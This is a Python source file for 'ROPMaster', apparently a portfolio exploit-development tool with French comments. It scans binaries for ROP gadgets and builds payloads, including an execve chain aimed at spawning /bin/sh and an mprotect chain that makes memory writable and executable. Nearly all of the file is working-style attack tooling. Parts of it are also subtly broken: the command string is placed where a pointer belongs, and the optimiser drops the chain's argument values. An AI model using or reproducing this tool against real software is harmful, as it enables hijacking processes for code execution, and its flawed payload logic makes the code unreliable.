#!/usr/bin/env python3
"""
ROPMaster - Générateur Automatique de Chaînes ROP
================================================

Outil avancé pour la recherche automatique de gadgets ROP et la génération
de chaînes d'exploitation pour différentes architectures et fonctions.

Author: Cybersecurity Portfolio
Version: 1.0.0
License: MIT (Educational Use Only)
"""

import struct
import subprocess
import re
import json
import logging
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
import capstone
import keystone

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class Architecture(Enum):
    """Architectures supportées"""
    X86 = "x86"
    X64 = "x64" 
    ARM = "arm"
    ARM64 = "arm64"

@dataclass
class ROPGadget:
    """Représentation d'un gadget ROP"""
    address: int
    instructions: List[str]
    bytes_data: bytes
    size: int
    category: str = ""
    usefulness: int = 0  # Score d'utilité (0-10)

@dataclass
class ROPChain:
    """Chaîne ROP complète"""
    function: str
    arguments: List[Any]
    gadgets: List[ROPGadget]
    payload: bytes
    success_rate: float = 0.0

class GadgetClassifier:
    """Classification automatique des gadgets ROP"""
    
    CATEGORIES = {
        'memory_access': [r'mov.*\[(.*)\]', r'lea.*', r'push.*', r'pop.*'],
        'arithmetic': [r'add.*', r'sub.*', r'xor.*', r'inc.*', r'dec.*'],
        'control_flow': [r'ret.*', r'call.*', r'jmp.*', r'je.*', r'jne.*'],
        'register_manipulation': [r'mov.*', r'xchg.*', r'push.*', r'pop.*'],
        'syscall': [r'int.*', r'syscall.*', r'sysenter.*'],
        'function_call': [r'call.*', r'ret.*']
    }
    
    @classmethod
    def classify(cls, instructions: List[str]) -> str:
        """Classifie un gadget selon ses instructions"""
        instruction_text = ' '.join(instructions).lower()
        
        for category, patterns in cls.CATEGORIES.items():
            for pattern in patterns:
                if re.search(pattern, instruction_text):
                    return category
        
        return 'unknown'
    
    @classmethod
    def calculate_usefulness(cls, gadget: ROPGadget) -> int:
        """Calcule un score d'utilité pour un gadget"""
        score = 0
        instruction_text = ' '.join(gadget.instructions).lower()
        
        # Bonus pour les gadgets utiles
        if 'pop' in instruction_text and 'ret' in instruction_text:
            score += 8
        if 'mov' in instruction_text:
            score += 6
        if 'add' in instruction_text or 'sub' in instruction_text:
            score += 5
        if 'xor' in instruction_text:
            score += 4
        if 'call' in instruction_text:
            score += 7
        if 'syscall' in instruction_text:
            score += 9
        
        # Malus pour les gadgets problématiques
        if len(gadget.instructions) > 5:
            score -= 2
        if 'nop' in instruction_text:
            score -= 1
        
        return min(10, max(0, score))

class ROPGadgetFinder:
    """Recherche de gadgets ROP dans les binaires"""
    
    def __init__(self, binary_path: str, arch: Architecture = Architecture.X64):
        self.binary_path = binary_path
        self.arch = arch
        self.gadgets: List[ROPGadget] = []
        
        # Configuration Capstone pour le désassemblage
        if arch == Architecture.X86:
            self.cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
        elif arch == Architecture.X64:
            self.cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
        elif arch == Architecture.ARM:
            self.cs = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM)
        else:
            self.cs = capstone.Cs(capstone.CS_ARCH_ARM64, capstone.CS_MODE_ARM)
    
    def find_gadgets_ropgadget(self) -> List[ROPGadget]:
        """Utilise ROPgadget pour trouver des gadgets"""
        try:
            cmd = ['ROPgadget', '--binary', self.binary_path, '--dump']
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            gadgets = []
            for line in result.stdout.split('\n'):
                if ':' in line and 'ret' in line:
                    match = re.match(r'(0x[0-9a-f]+)\s*:\s*(.+)', line.strip())
                    if match:
                        address = int(match.group(1), 16)
                        instruction_text = match.group(2)
                        instructions = [inst.strip() for inst in instruction_text.split(';')]
                        
                        gadget = ROPGadget(
                            address=address,
                            instructions=instructions,
                            bytes_data=b'',  # Sera rempli plus tard
                            size=len(instructions),
                            category=GadgetClassifier.classify(instructions)
                        )
                        gadget.usefulness = GadgetClassifier.calculate_usefulness(gadget)
                        gadgets.append(gadget)
            
            logger.info(f"Found {len(gadgets)} gadgets with ROPgadget")
            return gadgets
            
        except Exception as e:
            logger.error(f"Failed to find gadgets: {e}")
            return []
    
    def find_gadgets_manual(self, binary_data: bytes) -> List[ROPGadget]:
        """Recherche manuelle de gadgets dans les données binaires"""
        gadgets = []
        
        # Recherche de séquences se terminant par 'ret' (0xC3 en x86/x64)
        ret_byte = b'\xc3'
        
        for i in range(len(binary_data) - 10):
            for length in range(2, 8):  # Gadgets de 2 à 8 instructions
                end_pos = i + length
                if end_pos < len(binary_data) and binary_data[end_pos] == ret_byte[0]:
                    gadget_bytes = binary_data[i:end_pos + 1]
                    
                    try:
                        # Désassemblage
                        instructions = []
                        for insn in self.cs.disasm(gadget_bytes, 0x1000 + i):
                            instructions.append(f"{insn.mnemonic} {insn.op_str}")
                        
                        if instructions and instructions[-1].startswith('ret'):
                            gadget = ROPGadget(
                                address=0x1000 + i,  # Adresse simulée
                                instructions=instructions,
                                bytes_data=gadget_bytes,
                                size=len(instructions),
                                category=GadgetClassifier.classify(instructions)
                            )
                            gadget.usefulness = GadgetClassifier.calculate_usefulness(gadget)
                            gadgets.append(gadget)
                    
                    except Exception:
                        continue
        
        logger.info(f"Found {len(gadgets)} gadgets manually")
        return gadgets
    
    def filter_gadgets(self, gadgets: List[ROPGadget], min_usefulness: int = 5) -> List[ROPGadget]:
        """Filtre les gadgets selon leur utilité"""
        filtered = [g for g in gadgets if g.usefulness >= min_usefulness]
        logger.info(f"Filtered to {len(filtered)} useful gadgets")
        return filtered
    
    def find_specific_gadgets(self, pattern: str) -> List[ROPGadget]:
        """Recherche des gadgets correspondant à un pattern spécifique"""
        matching_gadgets = []
        
        for gadget in self.gadgets:
            instruction_text = ' '.join(gadget.instructions).lower()
            if re.search(pattern.lower(), instruction_text):
                matching_gadgets.append(gadget)
        
        logger.info(f"Found {len(matching_gadgets)} gadgets matching '{pattern}'")
        return matching_gadgets

class ROPChainGenerator:
    """Générateur automatique de chaînes ROP"""
    
    def __init__(self, binary_path: str, arch: Architecture = Architecture.X64):
        self.binary_path = binary_path
        self.arch = arch
        self.finder = ROPGadgetFinder(binary_path, arch)
        self.gadgets = self.finder.find_gadgets_ropgadget()
        
        # Index des gadgets par type pour accès rapide
        self.gadget_index = self._index_gadgets()
    
    def _index_gadgets(self) -> Dict[str, List[ROPGadget]]:
        """Crée un index des gadgets par catégorie et pattern"""
        index = {
            'pop_ret': [],
            'mov': [],
            'add': [],
            'syscall': [],
            'call': [],
            'jmp': []
        }
        
        for gadget in self.gadgets:
            instruction_text = ' '.join(gadget.instructions).lower()
            
            if 'pop' in instruction_text and 'ret' in instruction_text:
                index['pop_ret'].append(gadget)
            if 'mov' in instruction_text:
                index['mov'].append(gadget)
            if 'add' in instruction_text:
                index['add'].append(gadget)
            if 'syscall' in instruction_text:
                index['syscall'].append(gadget)
            if 'call' in instruction_text:
                index['call'].append(gadget)
            if 'jmp' in instruction_text:
                index['jmp'].append(gadget)
        
        return index
    
    def find_pop_gadget(self, register: str) -> Optional[ROPGadget]:
        """Trouve un gadget 'pop register; ret'"""
        target_pattern = f"pop {register.lower()}"
        
        for gadget in self.gadget_index['pop_ret']:
            instruction_text = ' '.join(gadget.instructions).lower()
            if target_pattern in instruction_text:
                return gadget
        
        return None
    
    def build_execve_chain(self, command: str, args: List[str] = None) -> ROPChain:
        """Construit une chaîne ROP pour execve()"""
        if args is None:
            args = []
        
        chain_gadgets = []
        payload = b""
        
        if self.arch == Architecture.X64:
            # Linux x64 execve syscall: rax=59, rdi=filename, rsi=argv, rdx=envp
            
            # 1. pop rdi; ret (filename)
            rdi_gadget = self.find_pop_gadget("rdi")
            if rdi_gadget:
                chain_gadgets.append(rdi_gadget)
                payload += struct.pack("<Q", rdi_gadget.address)
                payload += command.encode() + b"\x00"
            
            # 2. pop rsi; ret (argv)
            rsi_gadget = self.find_pop_gadget("rsi")
            if rsi_gadget:
                chain_gadgets.append(rsi_gadget)
                payload += struct.pack("<Q", rsi_gadget.address)
                payload += struct.pack("<Q", 0x0)  # NULL argv
            
            # 3. pop rdx; ret (envp)
            rdx_gadget = self.find_pop_gadget("rdx")
            if rdx_gadget:
                chain_gadgets.append(rdx_gadget)
                payload += struct.pack("<Q", rdx_gadget.address)
                payload += struct.pack("<Q", 0x0)  # NULL envp
            
            # 4. pop rax; ret (syscall number)
            rax_gadget = self.find_pop_gadget("rax")
            if rax_gadget:
                chain_gadgets.append(rax_gadget)
                payload += struct.pack("<Q", rax_gadget.address)
                payload += struct.pack("<Q", 59)  # execve syscall number
            
            # 5. syscall; ret
            syscall_gadgets = self.gadget_index['syscall']
            if syscall_gadgets:
                syscall_gadget = syscall_gadgets[0]
                chain_gadgets.append(syscall_gadget)
                payload += struct.pack("<Q", syscall_gadget.address)
        
        success_rate = len(chain_gadgets) / 5.0  # 5 gadgets nécessaires
        
        chain = ROPChain(
            function="execve",
            arguments=[command] + args,
            gadgets=chain_gadgets,
            payload=payload,
            success_rate=success_rate
        )
        
        logger.info(f"Built execve ROP chain: {len(chain_gadgets)} gadgets, {success_rate:.2f} success rate")
        return chain
    
    def build_mprotect_chain(self, address: int, size: int, permissions: int) -> ROPChain:
        """Construit une chaîne ROP pour mprotect()"""
        chain_gadgets = []
        payload = b""
        
        if self.arch == Architecture.X64:
            # Linux x64 mprotect syscall: rax=10, rdi=addr, rsi=len, rdx=prot
            
            # 1. pop rdi; ret (address)
            rdi_gadget = self.find_pop_gadget("rdi")
            if rdi_gadget:
                chain_gadgets.append(rdi_gadget)
                payload += struct.pack("<Q", rdi_gadget.address)
                payload += struct.pack("<Q", address)
            
            # 2. pop rsi; ret (size)
            rsi_gadget = self.find_pop_gadget("rsi")
            if rsi_gadget:
                chain_gadgets.append(rsi_gadget)
                payload += struct.pack("<Q", rsi_gadget.address)
                payload += struct.pack("<Q", size)
            
            # 3. pop rdx; ret (permissions)
            rdx_gadget = self.find_pop_gadget("rdx")
            if rdx_gadget:
                chain_gadgets.append(rdx_gadget)
                payload += struct.pack("<Q", rdx_gadget.address)
                payload += struct.pack("<Q", permissions)  # PROT_READ|PROT_WRITE|PROT_EXEC = 7
            
            # 4. pop rax; ret (syscall number)
            rax_gadget = self.find_pop_gadget("rax")
            if rax_gadget:
                chain_gadgets.append(rax_gadget)
                payload += struct.pack("<Q", rax_gadget.address)
                payload += struct.pack("<Q", 10)  # mprotect syscall number
            
            # 5. syscall; ret
            syscall_gadgets = self.gadget_index['syscall']
            if syscall_gadgets:
                syscall_gadget = syscall_gadgets[0]
                chain_gadgets.append(syscall_gadget)
                payload += struct.pack("<Q", syscall_gadget.address)
        
        success_rate = len(chain_gadgets) / 5.0
        
        chain = ROPChain(
            function="mprotect",
            arguments=[address, size, permissions],
            gadgets=chain_gadgets,
            payload=payload,
            success_rate=success_rate
        )
        
        logger.info(f"Built mprotect ROP chain: {len(chain_gadgets)} gadgets")
        return chain
    
    def build_custom_chain(self, function_calls: List[Dict[str, Any]]) -> ROPChain:
        """Construit une chaîne ROP personnalisée avec plusieurs appels"""
        chain_gadgets = []
        payload = b""
        
        for call in function_calls:
            func_name = call['function']
            func_args = call.get('args', [])
            
            if func_name == 'execve':
                sub_chain = self.build_execve_chain(func_args[0], func_args[1:])
            elif func_name == 'mprotect':
                sub_chain = self.build_mprotect_chain(*func_args)
            else:
                logger.warning(f"Unknown function: {func_name}")
                continue
            
            chain_gadgets.extend(sub_chain.gadgets)
            payload += sub_chain.payload
        
        avg_success = sum(g.usefulness for g in chain_gadgets) / len(chain_gadgets) / 10.0 if chain_gadgets else 0
        
        chain = ROPChain(
            function="custom_chain",
            arguments=function_calls,
            gadgets=chain_gadgets,
            payload=payload,
            success_rate=avg_success
        )
        
        logger.info(f"Built custom ROP chain: {len(chain_gadgets)} gadgets")
        return chain
    
    def optimize_chain(self, chain: ROPChain) -> ROPChain:
        """Optimise une chaîne ROP en supprimant les gadgets redondants"""
        optimized_gadgets = []
        seen_addresses = set()
        
        for gadget in chain.gadgets:
            if gadget.address not in seen_addresses:
                optimized_gadgets.append(gadget)
                seen_addresses.add(gadget.address)
        
        # Reconstruction du payload
        payload = b""
        for gadget in optimized_gadgets:
            if self.arch == Architecture.X64:
                payload += struct.pack("<Q", gadget.address)
            else:
                payload += struct.pack("<I", gadget.address)
        
        optimized_chain = ROPChain(
            function=chain.function,
            arguments=chain.arguments,
            gadgets=optimized_gadgets,
            payload=payload,
            success_rate=chain.success_rate
        )
        
        reduction = len(chain.gadgets) - len(optimized_gadgets)
        logger.info(f"Optimized ROP chain: removed {reduction} redundant gadgets")
        return optimized_chain
    
    def save_chain(self, chain: ROPChain, filename: str) -> None:
        """Sauvegarde une chaîne ROP dans un fichier"""
        chain_data = {
            'function': chain.function,
            'arguments': chain.arguments,
            'success_rate': chain.success_rate,
            'gadgets': [
                {
                    'address': hex(g.address),
                    'instructions': g.instructions,
                    'category': g.category,
                    'usefulness': g.usefulness
                }
                for g in chain.gadgets
            ],
            'payload': chain.payload.hex()
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(chain_data, f, indent=2)
            logger.info(f"ROP chain saved to {filename}")
        except Exception as e:
            logger.error(f"Failed to save ROP chain: {e}")
    
    def load_chain(self, filename: str) -> Optional[ROPChain]:
        """Charge une chaîne ROP depuis un fichier"""
        try:
            with open(filename, 'r') as f:
                chain_data = json.load(f)
            
            gadgets = []
            for g_data in chain_data['gadgets']:
                gadget = ROPGadget(
                    address=int(g_data['address'], 16),
                    instructions=g_data['instructions'],
                    bytes_data=b'',  # Non sauvegardé
                    size=len(g_data['instructions']),
                    category=g_data['category'],
                    usefulness=g_data['usefulness']
                )
                gadgets.append(gadget)
            
            chain = ROPChain(
                function=chain_data['function'],
                arguments=chain_data['arguments'],
                gadgets=gadgets,
                payload=bytes.fromhex(chain_data['payload']),
                success_rate=chain_data['success_rate']
            )
            
            logger.info(f"ROP chain loaded from {filename}")
            return chain
            
        except Exception as e:
            logger.error(f"Failed to load ROP chain: {e}")
            return None

def main():
    """Exemple d'utilisation de ROPMaster"""
    
    # Initialisation du générateur
    generator = ROPChainGenerator("/bin/ls", Architecture.X64)
    
    # Génération d'une chaîne execve
    execve_chain = generator.build_execve_chain("/bin/sh")
    print(f"Execve chain: {len(execve_chain.gadgets)} gadgets")
    print(f"Success rate: {execve_chain.success_rate:.2f}")
    
    # Génération d'une chaîne mprotect
    mprotect_chain = generator.build_mprotect_chain(0x601000, 4096, 7)
    print(f"Mprotect chain: {len(mprotect_chain.gadgets)} gadgets")
    
    # Sauvegarde
    generator.save_chain(execve_chain, "execve_chain.json")
    
    # Affichage des gadgets trouvés
    print(f"\nFound {len(generator.gadgets)} total gadgets:")
    for category, gadgets in generator.gadget_index.items():
        print(f"  {category}: {len(gadgets)} gadgets")

if __name__ == "__main__":
    main()